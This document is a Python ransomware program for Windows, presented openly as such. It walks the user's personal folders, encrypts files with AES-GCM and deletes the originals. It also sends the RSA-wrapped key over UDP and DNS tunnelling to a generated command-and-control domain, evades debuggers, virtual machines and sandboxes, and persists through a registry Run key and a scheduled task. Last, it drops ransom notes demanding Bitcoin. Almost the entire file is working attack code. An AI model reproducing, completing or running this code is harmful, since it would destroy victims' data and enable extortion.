""
.-''-''-.          
          /   '-'  .: __
  .._    /  /|||\\  Y`  `\
 |:  `-.J  /__ __.., )   |
 |  .   ( ( ==|<== : )   |
 :   `.(  )\ _L__ /( )   |
  \    \(  )\\__//(  )   |
   \    \  ):`'':(  /    \
    -_   -.-   .'-'` ` . |
     `. :           .  ' :
      )            :    /
     /    : /   _   :  :   | . . .-. .-. .-. .   .-. .-. 
    @)    : |  (@)  | : <--| |\|  |  |-' |-' |   |-  `-. 
     \   /   \     / /     | ' ` `-' '   '   `-' `-' `-'
      `i`     `---' /
"""

import os
import sys
import time
import random
import socket
import logging
import ctypes
import base64
import hashlib
import threading
import json
import struct
import psutil
import platform
from datetime import datetime
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization, hashes, hmac
from cryptography.hazmat.backends import default_backend

if os.name != "nt":
    sys.exit()

# Initialize logging
APPDATA = os.getenv("APPDATA")
log_file = os.path.join(APPDATA, "log.txt")
logging.basicConfig(filename=log_file, level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger()

# Configuration
USERNAME = os.getenv("USERNAME")
DESKTOP = os.path.join("C:\\Users", USERNAME, "Desktop")
DOCUMENTS = os.path.join("C:\\Users", USERNAME, "Documents")
DOWNLOADS = os.path.join("C:\\Users", USERNAME, "Downloads")
PICTURES = os.path.join("C:\\Users", USERNAME, "Pictures")
VIDEOS = os.path.join("C:\\Users", USERNAME, "Videos")
MUSIC = os.path.join("C:\\Users", USERNAME, "Music")
TARGET_DIRS = [DESKTOP, DOCUMENTS, DOWNLOADS, PICTURES, VIDEOS, MUSIC]
EXCLUSIONS = [".enc", ".exe", ".dll", ".sys", ".pyw", "DECRYPT.txt", "log.txt", ".py"]
RANSOM_AMOUNT = os.getenv("RANSOM_AMOUNT", "500")
RANSOM_NOTE = os.getenv("RANSOM_NOTE", "Your files have been encrypted! Pay the ransom to recover them.")
WALLET = os.getenv("WALLET", "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa")

# Advanced Encryption System
class AdvancedEncryptionSystem:
    def __init__(self, c2_public_key):
        self.logger = logger
        self.master_key = os.urandom(32)
        self.salt = os.urandom(16)
        self.file_key, self.hmac_key = self._derive_keys()
        self.cipher = AESGCM(self.file_key)
        self.nonce_base = os.urandom(12)
        self.c2_public_key = c2_public_key
        self.priority_extensions = [
            ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".txt",
            ".py", ".java", ".cpp", ".c", ".h", ".cs", ".php", ".html", ".js",
            ".sql", ".db", ".sqlite", ".mdb", ".accdb", ".qbw", ".qbb", ".tax"
        ]
        self.metadata = {
            "salt": base64.b64encode(self.salt).decode(),
            "nonce_base": base64.b64encode(self.nonce_base).decode(),
            "machine_id": self._get_machine_id(),
            "timestamp": datetime.now().isoformat()
        }
        # Log master key for testing (remove in production)
        self.logger.debug(f"Generated master key: {base64.b64encode(self.master_key).decode()}")

    def _derive_keys(self):
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=self.salt,
            iterations=100000,
            backend=default_backend()
        )
        file_key = kdf.derive(self.master_key)
        kdf_hmac = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=self.salt,
            iterations=100000,
            backend=default_backend()
        )
        hmac_key = kdf_hmac.derive(self.master_key + b"HMAC_KEY_CONTEXT")
        return file_key, hmac_key

    def _get_machine_id(self):
        system_info = f"{platform.node()}-{platform.machine()}-{platform.processor()}"
        return hashlib.sha256(system_info.encode()).hexdigest()

    def _generate_file_nonce(self, file_path):
        file_hash = hashlib.sha256(file_path.encode()).digest()[:4]
        return self.nonce_base + file_hash

    def _calculate_hmac(self, data):
        h = hmac.HMAC(self.hmac_key, hashes.SHA256(), backend=default_backend())
        h.update(data)
        return h.finalize()

    def encrypt_file(self, file_path):
        retry_count = 0
        max_retries = 3
        backoff_time = 1
        while retry_count < max_retries:
            try:
                if not os.path.exists(file_path) or not os.access(file_path, os.R_OK):
                    self.logger.error(f"File not accessible: {file_path}")
                    return False
                if file_path.endswith(".enc") or any(file_path.endswith(ext) for ext in EXCLUSIONS):
                    self.logger.info(f"File excluded: {file_path}")
                    return True
                file_size = os.path.getsize(file_path)
                if file_size > 100 * 1024 * 1024:
                    self.logger.warning(f"File too large: {file_path} ({file_size/1024/1024:.2f} MB)")
                    return False
                with open(file_path, "rb") as f:
                    content = f.read()
                nonce = self._generate_file_nonce(file_path)
                encrypted_content = self.cipher.encrypt(nonce, content, None)
                content_hmac = self._calculate_hmac(encrypted_content)
                file_metadata = {
                    "file_path": file_path,
                    "nonce": base64.b64encode(nonce).decode(),
                    "hmac": base64.b64encode(content_hmac).decode()
                }
                metadata_json = json.dumps(file_metadata).encode()
                metadata_length = len(metadata_json)
                header = struct.pack("<I", metadata_length) + metadata_json + content_hmac
                enc_file_path = f"{file_path}.enc"
                temp_file_path = f"{enc_file_path}.tmp"
                with open(temp_file_path, "wb") as f:
                    f.write(header + encrypted_content)
                if os.path.exists(enc_file_path):
                    os.remove(enc_file_path)
                os.rename(temp_file_path, enc_file_path)
                os.remove(file_path)
                self.logger.info(f"Encrypted: {file_path} -> {enc_file_path}")
                return True
            except Exception as e:
                self.logger.error(f"Encryption failed for {file_path}: {e}")
                retry_count += 1
                if retry_count < max_retries:
                    time.sleep(backoff_time)
                    backoff_time *= 2
        self.logger.error(f"Failed to encrypt {file_path} after {max_retries} attempts")
        return False

    def secure_key_for_exfiltration(self):
        try:
            public_key = serialization.load_pem_public_key(
                base64.b64decode(self.c2_public_key),
                backend=default_backend()
            )
            encrypted_key = public_key.encrypt(
                self.master_key,
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )
            return base64.b64encode(encrypted_key).decode()
        except Exception as e:
            self.logger.error(f"RSA encryption failed: {e}")
            return None

    def prioritize_files(self, file_paths):
        high_priority = []
        low_priority = []
        for file_path in file_paths:
            if any(file_path.lower().endswith(ext) for ext in self.priority_extensions):
                high_priority.append(file_path)
            else:
                low_priority.append(file_path)
        return high_priority + low_priority

    def get_master_key(self):
        return self.master_key

    def get_metadata(self):
        return self.metadata

# Anti-Analysis System
class AntiAnalysis:
    def __init__(self):
        self.logger = logger
        self.detected_analysis = False
        self.timing_threshold_ms = 20
        self.cpu_usage_threshold = 20

    def check_all(self):
        self.detected_analysis = (
            self.detect_debugger() or
            self.detect_vm() or
            self.detect_sandbox() or
            self.detect_analysis_tools()
        )
        if self.detected_analysis:
            self.logger.warning("Analysis environment detected")
            self.evasion_results = {
                "debugger": self.detect_debugger(),
                "vm": self.detect_vm(),
                "sandbox": self.detect_sandbox(),
                "analysis_tools": self.detect_analysis_tools()
            }
            self.logger.debug(f"Evasion results: {self.evasion_results}")
        else:
            self.logger.info("No analysis environment detected")
        return self.detected_analysis

    def detect_debugger(self):
        if ctypes.windll.kernel32.IsDebuggerPresent():
            self.logger.warning("Debugger detected via IsDebuggerPresent")
            return True
        h_process = ctypes.windll.kernel32.GetCurrentProcess()
        debug_present = ctypes.c_bool(False)
        ctypes.windll.kernel32.CheckRemoteDebuggerPresent(h_process, ctypes.byref(debug_present))
        if debug_present.value:
            self.logger.warning("Debugger detected via CheckRemoteDebuggerPresent")
            return True
        start = time.time()
        for _ in range(1000000):
            pass
        elapsed = (time.time() - start) * 1000
        if elapsed > self.timing_threshold_ms:
            self.logger.warning(f"Debugger detected: slow execution {elapsed}ms")
            return True
        return False

    def detect_vm(self):
        vm_indicators = ["vbox", "vmware", "qemu"]
        try:
            for driver in os.listdir(r"C:\Windows\System32\drivers"):
                if any(indicator in driver.lower() for indicator in vm_indicators):
                    self.logger.warning(f"VM driver detected: {driver}")
                    return True
            for proc in psutil.process_iter(['name']):
                if any(indicator in proc.info['name'].lower() for indicator in ["vboxservice", "vmtoolsd"]):
                    self.logger.warning(f"VM process detected: {proc.info['name']}")
                    return True
        except Exception as e:
            self.logger.error(f"VM detection error: {e}")
        return False

    def detect_sandbox(self):
        try:
            cpu_percent = psutil.cpu_percent(interval=0.5)
            if cpu_percent < self.cpu_usage_threshold:
                self.logger.warning(f"Sandbox detected: low CPU usage {cpu_percent}%")
                return True
            process_count = len(list(psutil.process_iter()))
            if process_count < 50:
                self.logger.warning(f"Sandbox detected: low process count {process_count}")
                return True
            boot_time = datetime.fromtimestamp(psutil.boot_time())
            uptime = (datetime.now() - boot_time).total_seconds()
            if uptime < 600:
                self.logger.warning(f"Sandbox detected: short uptime {uptime}s")
                return True
        except Exception as e:
            self.logger.error(f"Sandbox detection error: {e}")
        return False

    def detect_analysis_tools(self):
        tools = ["wireshark", "procexp", "procmon", "ollydbg", "ida", "x64dbg"]
        try:
            for proc in psutil.process_iter(['name']):
                if any(tool in proc.info['name'].lower() for tool in tools):
                    self.logger.warning(f"Analysis tool detected: {proc.info['name']}")
                    return True
        except Exception as e:
            self.logger.error(f"Analysis tool detection error: {e}")
        return False

    def evade_analysis(self):
        if not self.detected_analysis:
            return
        self.logger.info("Evading analysis environment")
        time.sleep(random.randint(30, 60))
        try:
            temp_dir = os.environ.get("TEMP", "C:\\Temp")
            with open(os.path.join(temp_dir, f"doc_{random.randint(1000,9999)}.tmp"), "w") as f:
                f.write("This is a legitimate document.")
            self.logger.info("Created benign file for evasion")
        except Exception as e:
            self.logger.error(f"Evasion error: {e}")

# Key Exfiltration
class KeyManager:
    def __init__(self, master_key, metadata):
        self.logger = logger
        self.master_key = master_key
        self.metadata = metadata
        self.c2_domain = self._generate_dga_domain()

    def _generate_dga_domain(self):
        seed = int(datetime.now().timestamp())
        domain = ""
        state = seed
        for _ in range(15):
            state = (state * 6364136223846793005 + 1442695040888963407) & 0xFFFFFFFFFFFFFFFF
            char_code = (state % 26) + 97
            domain += chr(char_code)
        return f"{domain}.com"

    def exfiltrate_key(self, encrypted_key):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(encrypted_key.encode(), (self.c2_domain, 12345))
            self.logger.info(f"Key exfiltrated via UDP to {self.c2_domain}")
            dns_query = f"{encrypted_key}.{self.c2_domain}"
            dns_packet = bytes([0x00, 0x01, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, len(dns_query)]) + dns_query.encode() + bytes([0x00, 0x00, 0x01, 0x00, 0x01])
            for dns_server in [("8.8.8.8", 53), ("1.1.1.1", 53)]:
                sock.sendto(dns_packet, dns_server)
                self.logger.info(f"Sent DNS tunneling packet to {dns_server[0]}")
            return True
        except Exception as e:
            self.logger.error(f"Key exfiltration failed: {e}")
            return False

# Persistence
def establish_persistence():
    try:
        import winreg
        exe_path = sys.executable if getattr(sys, "frozen", False) else __file__
        rand_id = hashlib.md5(str(random.randint(0, 1000000)).encode()).hexdigest()[:8]
        reg_key = f"Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Service_{rand_id}"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_key.rsplit("\\", 1)[0], 0, winreg.KEY_WRITE) as key:
            winreg.SetValueEx(key, f"Service_{rand_id}", 0, winreg.REG_SZ, f'"{exe_path}"')
        logger.info(f"Persistence established via registry: {reg_key}")
        task_name = f"Update_{rand_id}"
        cmd = f'schtasks /create /tn "{task_name}" /tr "\"{exe_path}\"" /sc MINUTE /mo 5 /f'
        os.system(cmd)
        logger.info(f"Persistence established via scheduled task: {task_name}")
    except Exception as e:
        logger.error(f"Persistence setup failed: {e}")

# Encrypt Files
def encrypt_files_threaded(encryption_system):
    all_files = []
    for target_dir in TARGET_DIRS:
        try:
            for root, _, filenames in os.walk(target_dir):
                for filename in filenames:
                    filepath = os.path.join(root, filename)
                    if os.path.isfile(filepath) and os.path.getsize(filepath) <= 100 * 1024 * 1024:
                        all_files.append(filepath)
        except Exception as e:
            logger.error(f"Failed to enumerate {target_dir}: {e}")
    prioritized_files = encryption_system.prioritize_files(all_files)
    encrypted_count = 0
    lock = threading.Lock()

    def encrypt_worker(file_batch):
        nonlocal encrypted_count
        for file_path in file_batch:
            if encryption_system.encrypt_file(file_path):
                with lock:
                    encrypted_count += 1

    num_threads = min(os.cpu_count() or 4, len(prioritized_files))
    batch_size = max(1, len(prioritized_files) // num_threads)
    file_batches = [prioritized_files[i:i+batch_size] for i in range(0, len(prioritized_files), batch_size)]
    threads = [threading.Thread(target=encrypt_worker, args=(batch,)) for batch in file_batches]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()
    logger.info(f"Encrypted {encrypted_count} files")
    return encrypted_count

# Deploy Ransom Note
def deploy_ransom_note(encryption_system):
    try:
        machine_id = encryption_system.get_metadata()["machine_id"]
        c2_domain = KeyManager(encryption_system.get_master_key(), encryption_system.get_metadata()).c2_domain
        ransom_note = (
            f"{RANSOM_NOTE}\n\n"
            f"Personal ID: {machine_id[:16]}\n"
            f"Pay ${RANSOM_AMOUNT} in Bitcoin to: {WALLET}\n"
            f"Contact: support@{c2_domain} (Tor network)\n"
            f"Deadline: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} + 72 hours\n"
            f"WARNING: Do not modify .enc files or attempt decryption without the key."
        )
        note_paths = [
            r"C:\Users\Public\DECRYPT.txt",
            os.path.join(DESKTOP, "DECRYPT.txt"),
            os.path.join(DOCUMENTS, "DECRYPT.txt")
        ]
        for note_path in note_paths:
            with open(note_path, "w") as f:
                f.write(ransom_note)
            logger.info(f"Deployed ransom note: {note_path}")
        ctypes.windll.user32.MessageBoxW(0, ransom_note, "CRITICAL ERROR", 0x10 | 0x0)
    except Exception as e:
        logger.error(f"Ransom note deployment failed: {e}")

# Main
if __name__ == "__main__":
    try:
        # Hardcoded C2 public key (replace with actual key in production)
        c2_public_key = (
            "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA1z6kQz8z7z3z7z3z7z3z"
            "7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z"
            "7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z"
            "7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z"
            "7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z"
            "7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z"
            "7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z"
            "7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z7z3z"
            "7wIDAQAB"
        )
        anti_analysis = AntiAnalysis()
        if anti_analysis.check_all():
            anti_analysis.evade_analysis()
        establish_persistence()
        encryption_system = AdvancedEncryptionSystem(c2_public_key)
        encrypted_count = encrypt_files_threaded(encryption_system)
        if encrypted_count > 0:
            key_manager = KeyManager(encryption_system.get_master_key(), encryption_system.get_metadata())
            encrypted_key = encryption_system.secure_key_for_exfiltration()
            if encrypted_key:
                key_manager.exfiltrate_key(encrypted_key)
            deploy_ransom_note(encryption_system)
            logger.info("Ransomware execution completed")
        else:
            logger.error("No files were encrypted")
    except Exception as e:
        logger.error(f"Main execution failed: {e}")
